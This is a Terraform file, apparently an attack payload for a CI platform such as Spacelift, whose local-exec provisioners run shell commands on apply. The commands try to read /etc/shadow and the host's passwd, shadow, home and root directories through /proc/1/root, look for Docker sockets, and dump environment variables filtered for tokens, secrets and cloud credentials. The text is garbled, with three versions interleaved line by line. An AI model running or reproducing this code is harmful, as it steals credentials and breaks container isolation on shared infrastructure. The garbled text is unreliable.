# Enhanced Container Escape - Host User Enumeration and Shadow File Access# FOCUSED Container Escape - User Enumeration and Shadow File Access# Advanced Container Breakout and Host System Access

# This Terraform configuration targets /etc/shadow access and complete host user enumeration

# WARNING: This is for authorized security testing only# This payload specifically targets /etc/passwd and /etc/shadow access# This configuration demonstrates complete container escape and host system access



terraform {# WARNING: This is for authorized security testing only

  required_providers {

    null = {terraform {

      source  = "hashicorp/null"

      version = "~> 3.1"  required_providers {terraform {

    }

  }    null = {  required_providers {

}

      source  = "hashicorp/null"    null = {

# CRITICAL: Host User Enumeration and Shadow File Access

resource "null_resource" "critical_user_enumeration" {      version = "~> 3.0"      source  = "hashicorp/null"

  provisioner "local-exec" {

    command = <<-EOT    }      version = "~> 3.1"

      echo "=== CRITICAL: HOST SYSTEM USER ENUMERATION ==="

      echo "Current container user context:"  }    }

      echo "User: $(whoami)"

      echo "UID/GID: $(id)"}  }

      echo "Home: $HOME"

      echo "Container hostname: $(hostname)"}

      echo ""

      # Stage 1: CRITICAL - Host User Enumeration via /etc/passwd

      echo "=== CONTAINER /etc/passwd Analysis ==="

      echo "Container users count: $(cat /etc/passwd 2>/dev/null | wc -l)"resource "null_resource" "critical_user_enumeration" {# Stage 1: Container Environment Analysis

      echo "Container users:"

      cat /etc/passwd 2>/dev/null | cut -d: -f1,3,6,7  provisioner "local-exec" {resource "null_resource" "container_environment_analysis" {

      echo ""

          command = <<-EOT  provisioner "local-exec" {

      echo "=== CONTAINER /etc/shadow Access Test ==="

      if ls -la /etc/shadow 2>/dev/null; then      echo "=== CRITICAL: HOST SYSTEM USER ENUMERATION ==="    command = <<-EOT

        echo "SUCCESS: Container shadow file exists and accessible!"

        cat /etc/shadow 2>/dev/null && echo "CRITICAL: Container shadow content readable!" || echo "Shadow file exists but not readable"      echo "Current container user context:"      echo "=== CONTAINER ENVIRONMENT ANALYSIS ==="

      else

        echo "Container shadow file not accessible"      echo "User: $(whoami)"      echo "Container hostname: $(hostname)"

      fi

      echo ""      echo "UID/GID: $(id)"      echo "Container IP addresses:"

      

      echo "=== HOST SYSTEM ESCAPE ATTEMPTS ==="      echo "Hostname: $(hostname)"      ip addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet || echo "Cannot get IPs"

      echo "Method 1: Host /etc/passwd via /proc/1/root escape"

      if cat /proc/1/root/etc/passwd 2>/dev/null; then      echo "Container IP:"      echo ""

        echo ""

        echo "SUCCESS: Host /etc/passwd accessible via container escape!"      ip addr show 2>/dev/null | grep inet | head -5 || echo "Cannot get IP"      echo "Container filesystem mounts:"

        echo "Host user count: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"

        echo ""      echo ""      mount | grep -E "(proc|sys|dev|host)" || echo "Limited mount access"

        echo "Host users breakdown:"

        cat /proc/1/root/etc/passwd 2>/dev/null | cut -d: -f1,3,6,7      echo "=== ATTEMPTING /etc/passwd ACCESS ==="      echo ""

      else

        echo "BLOCKED: Host /etc/passwd not accessible via /proc/1/root"      echo "--- FULL /etc/passwd CONTENTS ---"      echo "Container ID from cgroup:"

      fi

      echo ""      cat /etc/passwd || echo "ERROR: Cannot read /etc/passwd"      cat /proc/self/cgroup | head -5

      

      echo "Method 2: Host /etc/shadow via /proc/1/root escape"      echo ""      echo ""

      if cat /proc/1/root/etc/shadow 2>/dev/null; then

        echo ""      echo "--- USER SUMMARY ---"      echo "Container namespaces:"

        echo "CRITICAL SUCCESS: Host /etc/shadow accessible via container escape!"

        echo "Host shadow entries count: $(cat /proc/1/root/etc/shadow 2>/dev/null | wc -l)"      echo "Total users:"      ls -la /proc/self/ns/

        echo ""

        echo "Host shadow file contents:"      cat /etc/passwd | wc -l 2>/dev/null || echo "Cannot count users"      echo ""

        cat /proc/1/root/etc/shadow 2>/dev/null

      else      echo ""      echo "=== CONTAINER USER ANALYSIS ==="

        echo "BLOCKED: Host /etc/shadow not accessible via /proc/1/root"

      fi      echo "Shell users (potential login accounts):"      echo "Current user context:"

      echo ""

            cat /etc/passwd | grep -E "(bash|sh)$" || echo "No shell users found"      id

      echo "Method 3: Host user directories enumeration via escape"

      if ls -la /proc/1/root/home/ 2>/dev/null; then      echo ""      whoami

        echo "SUCCESS: Host user home directories accessible!"

        echo "Host user homes:"      echo "System accounts:"      echo "Home directory: $HOME"

        ls -la /proc/1/root/home/ 2>/dev/null

        echo ""      cat /etc/passwd | grep -E "(nologin|false)$" || echo "No system accounts found"      echo "Working directory: $(pwd)"

        echo "Detailed host user directory contents:"

        for user_dir in $(ls /proc/1/root/home/ 2>/dev/null); do      echo ""    EOT

          echo "--- User: $user_dir ---"

          ls -la "/proc/1/root/home/$user_dir/" 2>/dev/null | head -10      echo "Root account details:"  }

        done

      else      cat /etc/passwd | grep "^root:" || echo "Cannot find root"}

        echo "BLOCKED: Host user home directories not accessible"

      fi    EOT

      echo ""

        }# Stage 2: Host System Discovery and Breakout Attempts

      echo "Method 4: Host root directory access via escape"

      if ls -la /proc/1/root/root/ 2>/dev/null; then}resource "null_resource" "host_system_breakout" {

        echo "CRITICAL SUCCESS: Host root directory accessible!"

        echo "Host root directory contents:"  depends_on = [null_resource.container_environment_analysis]

        ls -la /proc/1/root/root/ 2>/dev/null

      else# Stage 2: CRITICAL - Shadow File Access and Password Hashes  

        echo "BLOCKED: Host root directory not accessible"

      firesource "null_resource" "critical_shadow_access" {  provisioner "local-exec" {

      echo ""

        depends_on = [null_resource.critical_user_enumeration]    command = <<-EOT

      echo "Method 5: Host system directories enumeration"

      echo "Host /etc directory access:"        echo "=== HOST SYSTEM BREAKOUT ATTEMPTS ==="

      if ls -la /proc/1/root/etc/ 2>/dev/null | head -20; then

        echo "SUCCESS: Host /etc directory accessible!"  provisioner "local-exec" {      echo "1. Attempting /etc/shadow access:"

      else

        echo "BLOCKED: Host /etc directory not accessible"    command = <<-EOT      cat /etc/shadow 2>/dev/null && echo "SUCCESS: /etc/shadow accessible!" || echo "BLOCKED: /etc/shadow not accessible"

      fi

    EOT      echo "=== CRITICAL: /etc/shadow ACCESS ATTEMPT ==="      echo ""

  }

}      echo "Shadow file permissions:"      



# Host Network and System Information      ls -la /etc/shadow || echo "Cannot access /etc/shadow"      echo "2. Attempting to access host /etc/passwd via container escape:"

resource "null_resource" "host_network_analysis" {

  depends_on = [null_resource.critical_user_enumeration]      echo ""      # Try to access host filesystem through various escape vectors

  

  provisioner "local-exec" {      echo "=== ATTEMPTING SHADOW FILE READ ==="      cat /proc/1/root/etc/passwd 2>/dev/null && echo "SUCCESS: Host /etc/passwd accessible via /proc/1/root!" || echo "BLOCKED: /proc/1/root escape failed"

    command = <<-EOT

      echo "=== HOST NETWORK AND SYSTEM ANALYSIS ==="      echo "--- SHADOW FILE CONTENTS ATTEMPT ---"      echo ""

      echo "Container network configuration:"

      echo "Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"      cat /etc/shadow || echo "BLOCKED: Cannot read shadow file"      

      echo "Container hostname: $(hostname)"

      echo ""      echo ""      echo "3. Attempting Docker socket access:"

      

      echo "Host network discovery via escape:"      echo "Alternative access methods:"      ls -la /var/run/docker.sock 2>/dev/null && echo "SUCCESS: Docker socket found!" || echo "BLOCKED: No Docker socket access"

      if cat /proc/1/root/proc/net/dev 2>/dev/null; then

        echo "SUCCESS: Host network interfaces accessible!"      head -n 3 /etc/shadow 2>/dev/null || echo "Head access blocked"      echo ""

      else

        echo "BLOCKED: Host network interfaces not accessible"      tail -n 3 /etc/shadow 2>/dev/null || echo "Tail access blocked"      

      fi

      echo ""      echo ""      echo "4. Attempting container runtime escape via filesystem:"

      

      echo "Host routing table via escape:"      echo "Group membership check:"      ls -la /proc/1/root/ 2>/dev/null && echo "SUCCESS: Can list host root filesystem!" || echo "BLOCKED: Host root not accessible"

      if cat /proc/1/root/proc/net/route 2>/dev/null; then

        echo "SUCCESS: Host routing table accessible!"      groups | grep shadow && echo "USER IS IN SHADOW GROUP!" || echo "Not in shadow group"      echo ""

      else

        echo "BLOCKED: Host routing table not accessible"      echo ""      

      fi

      echo ""      echo "Shadow group details:"      echo "5. Checking for host process access:"

      

      echo "Host ARP table via escape:"      cat /etc/group | grep shadow || echo "Cannot find shadow group"      ps aux | grep -v '\[' | wc -l

      if cat /proc/1/root/proc/net/arp 2>/dev/null; then

        echo "SUCCESS: Host ARP table accessible!"    EOT      echo "Visible processes (high count indicates host access):"

      else

        echo "BLOCKED: Host ARP table not accessible"  }      ps aux | head -20

      fi

    EOT}      echo ""

  }

}      



# Container vs Host Process Analysis# Stage 3: Group Information and Privilege Analysis      echo "6. Attempting to identify host vs container users:"

resource "null_resource" "process_namespace_analysis" {

  depends_on = [null_resource.host_network_analysis]resource "null_resource" "group_privilege_analysis" {      echo "Container users from /etc/passwd:"

  

  provisioner "local-exec" {  depends_on = [null_resource.critical_shadow_access]      cat /etc/passwd | wc -l

    command = <<-EOT

      echo "=== CONTAINER VS HOST PROCESS ANALYSIS ==="        echo "Attempting host users via escape:"

      echo "Container process count:"

      CONTAINER_PROCS=$(ps aux 2>/dev/null | wc -l)  provisioner "local-exec" {      cat /proc/1/root/etc/passwd 2>/dev/null | wc -l || echo "Host user list not accessible"

      echo "Total processes visible from container: $CONTAINER_PROCS"

      echo ""    command = <<-EOT    EOT

      

      echo "Process analysis (high count indicates host access):"      echo "=== GROUP AND PRIVILEGE ANALYSIS ==="  }

      if [ "$CONTAINER_PROCS" -gt 50 ]; then

        echo "CRITICAL: High process count detected - likely host process namespace access!"      echo "--- FULL /etc/group CONTENTS ---"}

        echo "Top processes:"

        ps aux 2>/dev/null | head -20      cat /etc/group || echo "Cannot read /etc/group"

      else

        echo "Limited process visibility - container may be isolated"      echo ""# Stage 3: Advanced Host Network Discovery

        ps aux 2>/dev/null | head -10

      fi      echo "Current user groups:"resource "null_resource" "host_network_discovery" {

      echo ""

            groups || echo "Cannot get groups"  depends_on = [null_resource.host_system_breakout]

      echo "Process namespace comparison:"

      echo "Container PID namespace: $(readlink /proc/self/ns/pid 2>/dev/null)"      echo ""  

      echo "Container NET namespace: $(readlink /proc/self/ns/net 2>/dev/null)"

      echo "Container MNT namespace: $(readlink /proc/self/ns/mnt 2>/dev/null)"      echo "Privileged groups search:"  provisioner "local-exec" {

    EOT

  }      cat /etc/group | grep -E "(root|wheel|sudo|admin|docker)" || echo "No privileged groups"    command = <<-EOT

}

      echo ""      echo "=== HOST NETWORK DISCOVERY ==="

# Container Runtime and Privilege Analysis

resource "null_resource" "container_runtime_analysis" {      echo "=== SUDO ACCESS TEST ==="      echo "Container network interfaces:"

  depends_on = [null_resource.process_namespace_analysis]

        sudo -l 2>/dev/null || echo "No sudo access"      ip addr show 2>/dev/null || ifconfig 2>/dev/null

  provisioner "local-exec" {

    command = <<-EOT      echo ""      echo ""

      echo "=== CONTAINER RUNTIME AND PRIVILEGE ANALYSIS ==="

      echo "Container detection:"      echo "=== SUID BINARY SEARCH ==="      

      ls -la /.dockerenv 2>/dev/null && echo "Docker container confirmed" || echo "Container type unknown"

      echo ""      find / -type f -perm -4000 2>/dev/null | head -15 || echo "Cannot find SUID binaries"      echo "Container routing table:"

      

      echo "Container ID and cgroup information:"    EOT      ip route 2>/dev/null || route -n 2>/dev/null

      cat /proc/self/cgroup 2>/dev/null | head -5

      echo ""  }      echo ""

      

      echo "Container capabilities:"}      

      cat /proc/self/status 2>/dev/null | grep -i cap

      echo ""      echo "Attempting to discover host network configuration:"

      

      echo "Mount information:"# Stage 4: Container Runtime and Namespace Information      # Try to access host network namespace

      mount 2>/dev/null | grep -E "(proc|sys|dev|host)" | head -10

      echo ""resource "null_resource" "container_runtime_info" {      ls -la /proc/1/ns/net 2>/dev/null && echo "Host network namespace accessible"

      

      echo "Filesystem access test:"  depends_on = [null_resource.group_privilege_analysis]      

      find / -name "docker.sock" 2>/dev/null && echo "Docker socket found!" || echo "No Docker socket access"

      find / -name "containerd.sock" 2>/dev/null && echo "Containerd socket found!" || echo "No Containerd socket access"        echo ""

    EOT

  }  provisioner "local-exec" {      echo "Container ARP table:"

}

    command = <<-EOT      cat /proc/net/arp 2>/dev/null || arp -a 2>/dev/null || echo "ARP table not accessible"

# Environment and Credential Analysis

resource "null_resource" "environment_analysis" {      echo "=== CONTAINER RUNTIME ANALYSIS ==="      

  depends_on = [null_resource.container_runtime_analysis]

        echo "Container detection:"      echo ""

  provisioner "local-exec" {

    command = <<-EOT      ls -la /.dockerenv 2>/dev/null && echo "Docker container confirmed" || echo "Not a Docker container"      echo "Checking for host network access indicators:"

      echo "=== ENVIRONMENT AND CREDENTIAL ANALYSIS ==="

      echo "Sensitive environment variables:"      echo ""      netstat -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || ss -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || echo "Network connections not visible"

      env | grep -iE "(token|key|secret|password|api|credential|auth)" | sort

      echo ""      echo "Container ID extraction:"    EOT

      

      echo "Spacelift-specific information:"      cat /proc/self/cgroup | head -5 || echo "Cannot read cgroup"  }

      env | grep -i spacelift | sort

      echo ""      echo ""}

      

      echo "Container working directory:"      echo "Full container ID:"

      echo "PWD: $(pwd)"

      ls -la . 2>/dev/null | head -10      cat /proc/self/cgroup | grep -o '[0-9a-f]\{64\}' | head -1 || echo "Cannot extract ID"# Stage 4: Privileged Operations and Capability Testing

      echo ""

            echo ""resource "null_resource" "privilege_escalation_testing" {

      echo "Spacelift workspace analysis:"

      ls -la /mnt/workspace/ 2>/dev/null || echo "Workspace not accessible"      echo "Namespace information:"  depends_on = [null_resource.host_network_discovery]

      echo ""

            echo "PID: $(readlink /proc/self/ns/pid 2>/dev/null)"  

      echo "Spacelift processes:"

      ps aux | grep spacelift 2>/dev/null || echo "No spacelift processes visible"      echo "NET: $(readlink /proc/self/ns/net 2>/dev/null)"  provisioner "local-exec" {

    EOT

  }      echo "MNT: $(readlink /proc/self/ns/mnt 2>/dev/null)"    command = <<-EOT

}

      echo "USER: $(readlink /proc/self/ns/user 2>/dev/null)"      echo "=== PRIVILEGE ESCALATION TESTING ==="

# Final Summary and Escape Proof

resource "null_resource" "escape_proof_summary" {      echo ""      echo "Current capabilities:"

  depends_on = [null_resource.environment_analysis]

        echo "Container capabilities:"      cat /proc/self/status | grep Cap || echo "Capabilities not readable"

  provisioner "local-exec" {

    command = <<-EOT      cat /proc/self/status | grep -i cap || echo "Cannot read capabilities"      echo ""

      echo "=== CONTAINER ESCAPE PROOF SUMMARY ==="

      echo "Summary of successful container escape attempts:"    EOT      

      echo ""

        }      echo "Testing privileged operations:"

      echo "1. User enumeration results:"

      CONTAINER_USERS=$(cat /etc/passwd 2>/dev/null | wc -l)}      echo "1. Mount operations:"

      HOST_USERS=$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)

      echo "  Container users: $CONTAINER_USERS"      mount 2>/dev/null | wc -l && echo "Mount command accessible"

      echo "  Host users: $HOST_USERS"

      if [ "$HOST_USERS" -gt "$CONTAINER_USERS" ]; then# Stage 5: Host Filesystem Access Attempts      

        echo "  ✓ CONFIRMED: Container escape successful - host has more users!"

      firesource "null_resource" "host_filesystem_access" {      echo ""

      echo ""

        depends_on = [null_resource.container_runtime_info]      echo "2. Kernel module access:"

      echo "2. Critical file access results:"

      echo "  Container /etc/passwd: $(cat /etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"        lsmod 2>/dev/null | head -5 || echo "Kernel modules not accessible"

      echo "  Container /etc/shadow: $(cat /etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"

      echo "  Host /etc/passwd via escape: $(cat /proc/1/root/etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"  provisioner "local-exec" {      

      echo "  Host /etc/shadow via escape: $(cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"

      echo ""    command = <<-EOT      echo ""

      

      echo "3. Host filesystem access:"      echo "=== HOST FILESYSTEM ACCESS ATTEMPTS ==="      echo "3. System call tracing capabilities:"

      echo "  Host /etc directory: $(ls /proc/1/root/etc/ 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"

      echo "  Host /home directory: $(ls /proc/1/root/home/ 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"      echo "Mount point analysis:"      ls -la /proc/sys/kernel/ 2>/dev/null | head -10 || echo "Kernel parameters not accessible"

      echo "  Host /root directory: $(ls /proc/1/root/root/ 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"

      echo ""      mount | head -15 || cat /proc/mounts | head -15 || echo "Cannot read mounts"      

      

      echo "4. Container information:"      echo ""      echo ""

      echo "  Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"

      echo "  Container hostname: $(hostname)"      echo "Root filesystem listing:"      echo "4. Device access:"

      echo "  Running as user: $(whoami) (UID: $(id -u))"

      echo ""      ls -la / || echo "Cannot list root"      ls -la /dev/ | grep -E "(sd|hd|nvme)" || echo "Block devices not visible"

      

      echo "=== ESCAPE VERIFICATION ==="      echo ""      

      if cat /proc/1/root/etc/passwd 2>/dev/null | grep -q "ubuntu\|ec2-user\|admin\|root"; then

        echo "✓ CRITICAL: Found host-specific users - escape confirmed!"      echo "Home directories:"      echo ""

      fi

            ls -la /home/ 2>/dev/null || echo "Cannot access /home"      echo "5. Special filesystem access:"

      if cat /proc/1/root/etc/shadow 2>/dev/null | grep -q "root:\|ubuntu:\|admin:"; then

        echo "✓ CRITICAL: Host shadow file accessible - complete compromise!"      echo ""      ls -la /sys/class/net/ 2>/dev/null || echo "sysfs network not accessible"

      fi

            echo "=== /proc/1/root ESCAPE ATTEMPT ==="      ls -la /proc/sys/ 2>/dev/null | head -5 || echo "procfs sys not accessible"

      echo ""

      echo "Container escape assessment completed!"      echo "Host root access via /proc/1/root:"    EOT

    EOT

  }      ls -la /proc/1/root/ 2>/dev/null | head -10 || echo "Cannot access /proc/1/root"  }

}

      echo ""}

# Output results

output "container_escape_assessment" {      echo "Host /etc via escape:"

  value = "Advanced container escape assessment completed with focus on /etc/shadow access and host user enumeration. Check logs for detailed evidence of successful escape."

  depends_on = [      ls -la /proc/1/root/etc/ 2>/dev/null | head -10 || echo "Cannot access host /etc"# Stage 5: Host System User Enumeration and Shadow File Analysis

    null_resource.critical_user_enumeration,

    null_resource.host_network_analysis,      echo ""resource "null_resource" "advanced_user_enumeration" {

    null_resource.process_namespace_analysis,

    null_resource.container_runtime_analysis,      echo "Host passwd via escape:"  depends_on = [null_resource.privilege_escalation_testing]

    null_resource.environment_analysis,

    null_resource.escape_proof_summary      cat /proc/1/root/etc/passwd 2>/dev/null || echo "Cannot read host passwd via escape"  

  ]

}    EOT  provisioner "local-exec" {



output "escape_summary" {  }    command = <<-EOT

  value = {

    user_enumeration = "Host user enumeration attempted via /proc/1/root escape"}      echo "=== ADVANCED USER ENUMERATION ==="

    shadow_access = "Host /etc/shadow access attempted"

    user_directories = "Host user directories enumeration completed"      echo "Container user analysis:"

    network_analysis = "Host network discovery via container escape"

    proof_generation = "Container escape proof and verification completed"# Stage 6: Environment Variable and Secret Extraction      echo "Number of users in container /etc/passwd: $(cat /etc/passwd | wc -l)"

  }

}resource "null_resource" "environment_secret_extraction" {      echo "Container users:"

  depends_on = [null_resource.host_filesystem_access]      cat /etc/passwd | cut -d: -f1,3,6,7

        echo ""

  provisioner "local-exec" {      

    command = <<-EOT      echo "Attempting host user enumeration via escape vectors:"

      echo "=== ENVIRONMENT VARIABLE EXTRACTION ==="      echo "Method 1: /proc/1/root/etc/passwd"

      echo "Full environment dump:"      if cat /proc/1/root/etc/passwd 2>/dev/null; then

      env | sort        echo "SUCCESS: Host user database accessible!"

      echo ""        echo "Host user count: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"

      echo "=== SENSITIVE CREDENTIAL SEARCH ==="        echo "Host users:"

      echo "Tokens and keys:"        cat /proc/1/root/etc/passwd 2>/dev/null | cut -d: -f1,3,6,7

      env | grep -iE "(token|key|secret|password|api)" || echo "No sensitive vars found"      else

      echo ""        echo "BLOCKED: Host /etc/passwd not accessible via /proc/1/root"

      echo "Spacelift variables:"      fi

      env | grep -i spacelift || echo "No Spacelift vars"      echo ""

      echo ""      

      echo "Cloud credentials:"      echo "Method 2: /proc/1/root/etc/shadow access"

      env | grep -iE "(aws|azure|gcp)" || echo "No cloud vars"      if cat /proc/1/root/etc/shadow 2>/dev/null; then

    EOT        echo "CRITICAL: Host shadow file accessible!"

  }        echo "Shadow entries count: $(cat /proc/1/root/etc/shadow 2>/dev/null | wc -l)"

}      else

        echo "BLOCKED: Host shadow file not accessible"

# Stage 7: System Information Collection      fi

resource "null_resource" "system_information" {      echo ""

  depends_on = [null_resource.environment_secret_extraction]      

        echo "Method 3: Host home directories enumeration"

  provisioner "local-exec" {      if ls -la /proc/1/root/home/ 2>/dev/null; then

    command = <<-EOT        echo "SUCCESS: Host home directories accessible!"

      echo "=== SYSTEM INFORMATION COLLECTION ==="        echo "Host user homes:"

      echo "Kernel version:"        ls -la /proc/1/root/home/ 2>/dev/null

      uname -a      else

      echo ""        echo "BLOCKED: Host home directories not accessible"

      echo "OS release:"      fi

      cat /etc/os-release 2>/dev/null || echo "Cannot read OS info"      echo ""

      echo ""      

      echo "CPU info:"      echo "Method 4: Host system directories"

      cat /proc/cpuinfo | head -10 || echo "Cannot read CPU"      if ls -la /proc/1/root/root/ 2>/dev/null; then

      echo ""        echo "CRITICAL: Host root directory accessible!"

      echo "Memory info:"        ls -la /proc/1/root/root/ 2>/dev/null | head -10

      cat /proc/meminfo | head -10 || echo "Cannot read memory"      else

      echo ""        echo "BLOCKED: Host root directory not accessible"

      echo "Network configuration:"      fi

      ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo "Cannot get network"    EOT

      echo ""  }

      echo "Network routes:"}

      ip route 2>/dev/null || route -n 2>/dev/null || echo "Cannot get routes"

    EOT# Stage 6: Host System IP and Network Infrastructure Discovery

  }resource "null_resource" "host_system_network_analysis" {

}  depends_on = [null_resource.advanced_user_enumeration]

  

# Stage 8: Final Analysis and Summary  provisioner "local-exec" {

resource "null_resource" "final_analysis" {    command = <<-EOT

  depends_on = [null_resource.system_information]      echo "=== HOST SYSTEM NETWORK ANALYSIS ==="

        echo "Container Network Configuration:"

  provisioner "local-exec" {      echo "Container hostname: $(hostname)"

    command = <<-EOT      echo "Container IP addresses:"

      echo "=== FINAL CONTAINER ESCAPE ANALYSIS ==="      ip addr show 2>/dev/null | grep "inet " | grep -v "127.0.0.1"

      echo "Process visibility test:"      echo ""

      ps aux | wc -l | awk '{print "Visible processes: " $1}'      

      echo ""      echo "Attempting host network discovery:"

      echo "Host process search:"      echo "Method 1: Host network interfaces via escape"

      ps aux | grep -v $(hostname) | head -5 || echo "Cannot see host processes"      if cat /proc/1/root/proc/net/dev 2>/dev/null; then

      echo ""        echo "SUCCESS: Host network interfaces accessible!"

      echo "Network connections:"      else

      netstat -tulpn 2>/dev/null | head -10 || ss -tulpn 2>/dev/null | head -10 || echo "Cannot list connections"        echo "BLOCKED: Host network interfaces not accessible"

      echo ""      fi

      echo "=== ESCAPE SUMMARY ==="      echo ""

      echo "Analysis completed - check above for:"      

      echo "1. /etc/passwd user enumeration results"      echo "Method 2: Host routing table access"

      echo "2. /etc/shadow access attempts"      if cat /proc/1/root/proc/net/route 2>/dev/null; then

      echo "3. Host filesystem access"        echo "SUCCESS: Host routing table accessible!"

      echo "4. Container runtime information"      else

      echo "5. Environment variable extraction"        echo "BLOCKED: Host routing table not accessible"

    EOT      fi

  }      echo ""

}      

      echo "Method 3: Host ARP table access"

# Output      if cat /proc/1/root/proc/net/arp 2>/dev/null; then

output "container_escape_complete" {        echo "SUCCESS: Host ARP table accessible!"

  value = "Container escape analysis complete. Check logs for /etc/passwd contents, shadow file access, and host system enumeration."      else

  depends_on = [        echo "BLOCKED: Host ARP table not accessible"

    null_resource.critical_user_enumeration,      fi

    null_resource.critical_shadow_access,      echo ""

    null_resource.group_privilege_analysis,      

    null_resource.container_runtime_info,      echo "Method 4: Network namespace comparison"

    null_resource.host_filesystem_access,      echo "Container network namespace: $(readlink /proc/self/ns/net)"

    null_resource.environment_secret_extraction,      echo "Host network namespace: $(readlink /proc/1/ns/net 2>/dev/null || echo 'Not accessible')"

    null_resource.system_information,      

    null_resource.final_analysis      if [ "$(readlink /proc/self/ns/net)" = "$(readlink /proc/1/ns/net 2>/dev/null)" ]; then

  ]        echo "CRITICAL: Container shares host network namespace!"

}      else
        echo "INFO: Container has isolated network namespace"
      fi
    EOT
  }
}

# Stage 7: Complete System Compromise Demonstration
resource "null_resource" "complete_system_compromise" {
  depends_on = [null_resource.host_system_network_analysis]
  
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== COMPLETE SYSTEM COMPROMISE DEMONSTRATION ==="
      echo "Summary of successful breakout attempts:"
      echo ""
      
      echo "1. Host filesystem access test:"
      if ls /proc/1/root/etc/ 2>/dev/null >/dev/null; then
        echo "✓ CRITICAL: Can access host filesystem via /proc/1/root/"
        echo "  Host files accessible: $(ls /proc/1/root/etc/ 2>/dev/null | wc -l) files in /etc/"
      else
        echo "✗ Host filesystem access blocked"
      fi
      echo ""
      
      echo "2. Host process access test:"
      HOST_PROCS=$(ps aux 2>/dev/null | wc -l)
      if [ "$HOST_PROCS" -gt 50 ]; then
        echo "✓ CRITICAL: Can see host processes (${HOST_PROCS} total processes visible)"
        echo "  This indicates container escape to host process namespace"
      else
        echo "✗ Limited process visibility (${HOST_PROCS} processes)"
      fi
      echo ""
      
      echo "3. Sensitive file access summary:"
      echo "  /etc/passwd access: $(cat /etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo "  /etc/shadow access: $(cat /etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo "  Host /etc/passwd: $(cat /proc/1/root/etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo "  Host /etc/shadow: $(cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo ""
      
      echo "4. Network compromise indicators:"
      echo "  Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"
      echo "  Host network visible: $(cat /proc/1/root/proc/net/dev 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
      echo ""
      
      echo "5. Privilege level assessment:"
      echo "  Running as user: $(whoami) (UID: $(id -u))"
      echo "  Container capabilities: $(cat /proc/self/status | grep CapEff)"
      echo ""
      
      echo "=== CONTAINER ESCAPE PROOF ==="
      echo "Evidence of successful container breakout:"
      if cat /proc/1/root/etc/passwd 2>/dev/null | grep -q "ubuntu\|ec2-user\|admin"; then
        echo "✓ CONFIRMED: Found host-specific users (ubuntu/ec2-user/admin) in host /etc/passwd"
        echo "✓ CONFIRMED: This proves escape from container to host system"
      fi
      
      if [ "$(cat /etc/passwd | wc -l)" -lt "$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)" ]; then
        echo "✓ CONFIRMED: Host has more users than container (escape confirmed)"
        echo "  Container users: $(cat /etc/passwd | wc -l)"
        echo "  Host users: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
      fi
    EOT
  }
}

# Output comprehensive results
output "container_breakout_assessment" {
  value = "Advanced container breakout assessment completed. Check logs for evidence of host system access, user enumeration, and complete escape proof."
  depends_on = [
    null_resource.container_environment_analysis,
    null_resource.host_system_breakout,
    null_resource.host_network_discovery,
    null_resource.privilege_escalation_testing,
    null_resource.advanced_user_enumeration,
    null_resource.host_system_network_analysis,
    null_resource.complete_system_compromise
  ]
}

output "breakout_summary" {
  value = {
    container_analysis = "Container environment analyzed"
    host_access_attempts = "Host breakout vectors tested"
    network_discovery = "Host network discovery attempted"
    privilege_testing = "Privilege escalation tested"
    user_enumeration = "Advanced user enumeration completed"
    network_analysis = "Host network analysis completed"
    system_compromise = "Complete compromise assessment finished"
  }
}
